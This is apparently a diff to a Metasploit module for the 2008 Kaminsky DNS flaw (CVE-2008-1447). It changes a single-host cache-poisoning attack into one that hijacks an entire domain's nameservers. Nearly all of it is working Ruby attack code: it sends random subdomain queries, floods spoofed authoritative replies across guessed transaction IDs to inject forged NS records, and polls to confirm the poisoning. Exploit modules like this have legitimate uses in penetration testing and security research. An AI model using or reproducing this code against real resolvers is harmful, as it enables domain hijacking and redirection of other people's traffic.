@@ -5,23 +5,24 @@ require 'resolv'
 
 module Msf
 
-class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
+class Auxiliary::Spoof::Dns::BailiWickedDomain < Msf::Auxiliary
 
 	include Exploit::Remote::Ip
 
 	def initialize(info = {})
 		super(update_info(info,	
-			'Name'           => 'DNS BailiWicked Host Attack',
+			'Name'           => 'DNS BailiWicked Domain Attack',
 			'Description'    => %q{
 				This exploit attacks a fairly ubiquitous flaw in DNS implementations which 
-				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit caches a single
-				malicious host entry into the target nameserver by sending random sub-domain
-				queries to the target DNS server coupled with spoofed replies to those
-				queries from the authoritative nameservers for the domain which contain a
-				malicious host entry for the hostname to be poisoned in the authority and
-				additional records sections.  Eventually, a guessed ID will match and the
-				spoofed packet will get accepted, and due to the additional hostname entry
-				being within bailiwick constraints of the original request the malicious host
+				Dan Kaminsky found and disclosed ~Jul 2008.  This exploit caches a
+				malicious host entry into the target nameserver for each authoritative
+				nameserver for the target domain by sending random sub-domain queries
+				to the target DNS server coupled with spoofed replies to those queries
+				from the authoritative nameservers for the domain which contain a malicious
+				host entry for the hostname to be poisoned in the authority and additional
+				records sections.  Eventually, a guessed ID will match and the spoofed
+				packet will get accepted, and due to the additional hostname entry being
+				within bailiwick constraints of the original request the malicious host
 				entry will get cached.
 			},
 			'Author'         => [ 'I)ruid', 'hdm' ],
@@ -31,7 +32,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 				[
 					[ 'CVE', '2008-1447' ],
 					[ 'US-CERT-VU', '8000113' ],
-					[ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0002.txt' ],
+					[ 'URL', 'http://www.caughq.org/exploits/CAU-EX-2008-0003.txt' ],
 				],
 			'DisclosureDate' => 'Jul 21 2008'
 			))
@@ -39,11 +40,11 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			register_options(
 				[
 					OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
-					OptString.new('HOSTNAME', [true, 'Hostname to hijack', 'pwned.example.com']),
-					OptAddress.new('NEWADDR', [true, 'New address for hostname', '1.3.3.7']),
+					OptString.new('DOMAIN', [true, 'The domain to hijack', 'doxpara.com']),
+					OptString.new('NEWDNS', [true, 'The hostname of the replacement DNS server', nil]),
 					OptAddress.new('RECONS', [true, 'Nameserver used for reconnaissance', '208.67.222.222']),
 					OptInt.new('XIDS', [true, 'Number of XIDs to try for each query', 10]),
-					OptInt.new('TTL', [true, 'TTL for the malicious host entry', 31337]),
+					OptInt.new('TTL', [true, 'TTL for the malicious NS entry', 31337]),
 				], self.class)
 					
 	end
@@ -114,17 +115,17 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 	end
 		
 	def run
-		target   = rhost()
-		source   = Rex::Socket.source_address(target)
-		sport    = datastore['SRCPORT']
-		hostname = datastore['HOSTNAME'] + '.'
-		address  = datastore['NEWADDR']
-		recons   = datastore['RECONS']
-		xids     = datastore['XIDS'].to_i
-		newttl   = datastore['TTL'].to_i
-		xidbase  = rand(65536-xids)
-
-		domain = hostname.match(/[^\x2e]+\x2e[^\x2e]+\x2e$/)[0]
+		target  = rhost()
+		source  = Rex::Socket.source_address(target)
+		sport   = datastore['SRCPORT']
+		domain  = datastore['DOMAIN'] + '.'
+		newdns  = datastore['NEWDNS']
+		recons  = datastore['RECONS']
+		xids    = datastore['XIDS'].to_i
+		newttl  = datastore['TTL'].to_i
+		xidbase = rand(65536-xids)
+		
+		address = Rex::Text.rand_text(4).unpack("C4").join(".")
 
 		srv_sock = Rex::Socket.create_udp(
 			'PeerHost' => target,
@@ -157,10 +158,12 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			end
 		end
 
-		# Verify its not already cached
+
+
+		# Verify its not already poisoned
 		begin
 			query = Resolv::DNS::Message.new
-			query.add_question(hostname, Resolv::DNS::Resource::IN::A)
+			query.add_question(domain, Resolv::DNS::Resource::IN::NS)
 			query.rd = 0
 
 			begin
@@ -171,12 +174,14 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 				if answer and answer.length > 0
 					answer = Resolv::DNS::Message.decode(answer)
 					answer.each_answer do |name, ttl, data|
-						if((name.to_s + ".") == hostname  and data.address.to_s == address)
+
+						if((name.to_s + ".") == domain and data.name.to_s == newdns)
 							t = Time.now + ttl
-							print_status("Failure: This hostname is already in the target cache: #{name} == #{address}")
-							print_status("         Cache entry expires on #{t.to_s}... sleeping.")
-							cached = true
-							sleep ttl
+							print_status("Failure: This domain is already using #{newdns} as a nameserver")
+							print_status("         Cache entry expires on #{t.to_s}")
+							srv_sock.close
+							disconnect_ip
+							return
 						end
 					end
 					
@@ -188,9 +193,10 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			print_status("Error checking the DNS name: #{e.class} #{e} #{e.backtrace}")
 		end
 
+
 		res0 = Net::DNS::Resolver.new(:nameservers => [recons], :dns_search => false, :recursive => true) # reconnaissance resolver
 
-		print_status "Targeting nameserver #{target} for injection of #{hostname} as #{address}"
+		print_status "Targeting nameserver #{target} for injection of #{domain} nameservers as #{newdns}"
 
 		# Look up the nameservers for the domain
 		print_status "Querying recon nameserver for #{domain}'s nameservers..."
@@ -231,7 +237,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 
 		connect_ip if not ip_sock
 
-		print_status( "Attempting to inject a poison record for #{hostname} into #{target}:#{sport}...")
+		print_status( "Attempting to inject poison records for #{domain}'s nameservers into #{target}:#{sport}...")
 
 		while true
 			randhost = Rex::Text.rand_text_alphanumeric(12) + '.' + domain # randomize the hostname
@@ -259,10 +265,10 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			
 			# Send evil spoofed answer from ALL nameservers (barbs[*][:addr])
 			req.add_answer(randhost, newttl, Resolv::DNS::Resource::IN::A.new(address))
-			req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(hostname)))
-			req.add_additional(hostname, newttl, Resolv::DNS::Resource::IN::A.new(address))
+			req.add_authority(domain, newttl, Resolv::DNS::Resource::IN::NS.new(Resolv::DNS::Name.create(newdns)))
+			req.add_additional(newdns, newttl, Resolv::DNS::Resource::IN::A.new(address)) # Ignored
 			req.qr = 1
-			req.ra = 1
+			req.aa = 1
 
 			xidbase.upto(xidbase+xids-1) do |id|
 				req.id = id
@@ -292,7 +298,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			if queries % 250 == 0 
 				begin
 					query = Resolv::DNS::Message.new
-					query.add_question(hostname, Resolv::DNS::Resource::IN::A)
+					query.add_question(domain, Resolv::DNS::Resource::IN::NS)
 					query.rd = 0
 	
 					srv_sock.put(query.encode)
@@ -301,8 +307,9 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 					if answer and answer.length > 0
 						answer = Resolv::DNS::Message.decode(answer)
 						answer.each_answer do |name, ttl, data|
-							if((name.to_s + ".") == hostname and data.address.to_s == address)
-								print_status("Poisoning successful after #{queries} attempts: #{name} == #{address}")
+							if((name.to_s + ".") == domain and data.name.to_s == newdns)
+								print_status("Poisoning successful after #{queries} attempts: #{domain} == #{newdns}")
+								srv_sock.close
 								disconnect_ip
 								return
 							end
